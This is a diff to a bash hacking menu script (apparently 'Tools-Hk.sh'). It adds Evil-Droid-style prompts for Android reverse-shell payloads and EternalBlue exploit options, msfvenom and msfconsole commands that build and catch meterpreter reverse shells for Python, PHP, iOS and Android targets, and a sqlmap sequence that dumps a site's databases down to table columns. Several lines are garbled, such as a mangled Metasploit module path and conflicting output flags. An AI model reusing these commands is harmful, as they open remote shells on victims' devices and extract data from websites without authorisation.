@@ -8,6 +8,50 @@ purple='\e[1;35m'
 cyan='\e[1;36m' 
 white='\e[1;37m'
 yellow='\e[1;33m'
+
+# detect ctrl+c exiting
+trap ctrl_c INT
+ctrl_c() {
+clear
+echo -e $red"[*] (Ctrl + C ) Detected, Trying To Exit... "
+echo -e $red"[*] Stopping Services... "
+apache_svc_stop
+postgresql_stop
+sleep 1
+echo ""
+echo -e $yellow"[*] Thanks For Using Evil-Droid  :)"
+exit
+}
+ppppp () {
+
+echo -e $green     '{ -10- } ===> '$red " Exploit Windows Vista/XP/2000/2003 ONLY by IP (ms17_010_psexec) "
+echo -e $green     '{ -11- } ===> '$white " Exploit Windows 7/2008 x64 ONLY by IP (ms17_010_eternalblue)"
+}
+#function lhost
+function get_lhost() 
+{
+  LHOST=$(zenity --title="☢ SET LHOST ☢" --text "example: 4444" --entry-text "4444" --entry --width 300 2> /dev/null)
+}
+#function lport
+function get_lport() 
+{
+  LPORT=$(zenity --title="☢ SET LPORT ☢" --text "example: 4444" --entry-text "4444" --entry --width 300 2> /dev/null)
+}
+
+#function payload
+function get_payload()
+{
+  PAYLOAD=$(zenity --list --title "☢ EVIL-DROID ☢" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter_reverse_tcp" FALSE "android/meterpreter_reverse_http" FALSE "android/meterpreter_reverse_https" --width 400 --height 400 2> /dev/null)
+}
+function get_payload1()
+{
+  PAYLOAD=$(zenity --list --title "☢ EVIL-DROID ☢" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" --width 400 --height 400 2> /dev/null)
+}
+#function name
+function payload_name()
+{
+ apk_name=$(zenity --title "☢ PAYLOAD NAME ☢" --text "example: evilapk" --entry --entry-text "evilapk" --width 300 2> /dev/null)
+}
 sms () {
 rm -rif $HOME/Tools-Hk/sms.py
 touch $HOME/Tools-Hk/sms.py
@@ -28,6 +72,7 @@ echo "to='+967733014747'," >> $HOME/Tools-Hk/sms.py
 echo ')' >> $HOME/Tools-Hk/sms.py
 echo 'print(message.sid)' >> $HOME/Tools-Hk/sms.py
 python $HOME/Tools-Hk/sms.py
+
 }
 meta () {
 
@@ -79,6 +124,7 @@ echo -e $yellow
 
 
 }
+
 head
 echo -e $green   '{ -1- } ===> ' $white " Tools-Gnuroot & kali linux"
 echo ""
@@ -1586,6 +1632,7 @@ clear
 head
 echo -e $red   "msfvenom"
 echo ""
+
 echo -e $green     '{ -1- } ===> ' $white " Payload Android"
 echo -e $green     '{ -2- } ===> ' $red " Payload Windows"
 echo -e $green     '{ -3- } ===> ' $white " Payload Linux"
@@ -1775,7 +1822,7 @@ echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
 read -p " insert : " pathsave
 echo ""
 toilet "Loading" | lolcat
-msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=$lhost LPORT=$lport -o $pathsave/$name.elf
+msfvenom -f raw -p python/meterpreter/reverse_tcp -f elf LHOST=$lhost LPORT=$lport -o $pathsave/$name.py
 echo ""
 echo -e $green "do you want start metasploit? y/n"
 echo -e $red
@@ -1800,9 +1847,8 @@ echo -e $red
 read -p " insert : " port
 echo ""
 toilet "START" | lolcat
-msfconsole -x 'use exploit/multi/handler' -x 'set payload linux/x86/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
-clear
-echo -e $green"Save Payload To" $HOME/$name.elf
+msfconsole -x 'use exploit/multi/handler' -x 'set payload python/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
+
 else
 bash Tools-Hk.sh
 fi
@@ -1874,13 +1920,23 @@ figlet "Payload ios"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
 echo ""
+echo -e $green "What is LHOST"
+echo ""
+echo '~_~_~_~_~_~_~_~_~_~_~_~_'
+echo -e $red
+read -p " insert : " lhost
+echo ""
+echo '~_~_~_~ ~_~_~_~_~_~_~_~_~'
+echo ""
+echo '~_~_~_~_~_~_~_~_~_~_~_~_'
+echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
 echo -e $red
 read -p " insert : " lport
 echo ""
-echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
+echo '~_~_~_~_~_~_~_~_~_~_~~_~'
 echo ""
 echo -e $green "What is Name Payload"
 echo ""
@@ -1907,6 +1963,14 @@ then
 clear
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
 echo ""
+echo -e $green "What is LHOST"
+echo ""
+echo '~_~_~_~_~_~_~_~_~_~_~_~_'
+echo -e $red
+read -p " insert : " lhost
+echo ""
+echo '~_~_~_~_~_~_~_~_~_~_~_~_'
+echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
@@ -1915,22 +1979,8 @@ read -p " insert : " lport
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
 echo ""
-echo -e $green "What is Name Payload"
-echo ""
-echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
-echo -e $red
-read -p " insert : " name
-echo ""
-echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
-echo ""
-echo -e $green "What is pathsave"
-echo ""
-echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
-read -p " insert : " pathsave
-echo ""
-echo ""
 toilet "START" | lolcat
-msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp  LHOST=$lhost LPORT=$lport -o $pathsave/$name.api
+msfconsole -x 'use exploit/multi/handler' -x 'set payload apple_ios/aarch64/meterpreter_reverse_tcp' -x 'set LHOST '$lhost -x 'set LPORT '$lport -x 'exploit'
 else
 bash Tools-Hk.sh
 fi
@@ -2040,7 +2090,34 @@ echo ""
 toilet "Loading" | lolcat
 msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $pathsave/$name.php
 echo ""
-
+echo ""
+echo -e $green "do you want start  metasploit? y/n"
+echo -e $red
+read -p " insert : " yes_no
+if [ $yes_no = "y" ]
+then
+clear
+echo '~_~_~_~_~_~_~_~_~_~_~_~_'
+echo ""
+echo -e $green "What is LHOST"
+echo ""
+echo '~_~_~_~_~_~_~_~_~_~_~_~_'
+echo -e $red
+read -p " insert : " lhost
+echo ""
+echo '~_~_~_~_~_~_~_~_~_~_~_~_'
+echo ""
+echo -e $green "What is LPORT"
+echo ""
+echo '~_~_~_~_~_~_~_~_~_~_~_~_'
+echo -e $red
+read -p " insert : " lport
+echo ""
+toilet "START" | lolcat
+msfconsole -x 'use exploit/multi/handler' -x 'set payload php/meterpreter/reverse_tcp' -x 'set lport '$lport -x 'set lhost '$lhost -x 'exploit'
+else
+bash Tools-Hk.sh
+fi
 fi
 if [ $pa = 8 ]
 then
@@ -2095,11 +2172,8 @@ echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
 read -p " insert : " pathsave
 echo ""
-echo -e $red
-read -p " insert : " lport
-echo ""
+
 msfconsole -x 'use exploit/android/fileformat/adobe_read -p " insert : "er_pdf_js_interface.rb' -x 'set lport '$lport -x 'set lhost '$lhost -x 'exploit' 
-cp $HOME/.msf4/local/msf.pdf /mnt/sdcard 
 bash Tools-Hk.sh
 fi
 if [ $pa = 00 ]
@@ -2334,22 +2408,23 @@ then
 clear
 echo -e $yellow "please insert web url"
 read -p " insert : " wehk
-cd ~
-cd sqlmap
-python2 sqlmap.py -u $read -p " insert : " --dbs
-echo -e $yellow "please insert database"
-read -p " insert : " datat
-python2 sqlmap.py -u $read -p " insert : " --dbs
+echo ""
+echo $wehk
+echo ""
+sqlmap -u $wehk  --dbs
+echo "" 
+echo "please insert database"
+read -p " insert : " data
+sqlmap -u $wehk -D $data --tables
+echo ""
 echo -e $yellow "please insert table"
 read -p " insert : " table
-python2 sqlmap.py -u $read -p " insert : " -D $data --tables
+sqlmap -u $wehk -D $data -T $table --columns
+echo ""
 echo -e $yellow "please insert columns"
 read -p " insert : " columns
-python2 sqlmap.py -u $read -p " insert : " -D $data -T $tables columns
-echo -e $yellow "please insert data columns"
-read -p " insert : " dump
-python2 sqlmap.py -u $read -p " insert : " -D $data -T $tables -C $columns --dump
-
+sqlmap -u $wehk -D $data -T $table -C $columns --dump
+echo ""
 echo -e $yellow "Do you want define type hash insert y/n "
 read -p " insert : " typehash
 if [ $typehash = "y" ]
@@ -3089,24 +3164,7 @@ echo '~_~_~_~_~_~_~_~_~_~_~_~_'
 echo -e $red
 read -p " insert : " lport
 echo ""
-echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
-echo ""
-echo -e $green "What is Name Payload? "
-echo ""
-echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
-read -p " insert : " name
-echo ""
-echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
-echo ""
-echo -e $green "What is path seve "
-echo ""
-echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
-read -p " insert : " pathsave
-echo ""
-toilet "Loading" | lolcat
-msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $pathsave/$name.php
-echo ""
+msfconsole -x 'use auxiliary/gather/android_htmlfileprovider' -x 'set lport '$lport -x 'set lhost '$lhost -x 'exploit'
 
 fi
 if [ $pa = 8 ]
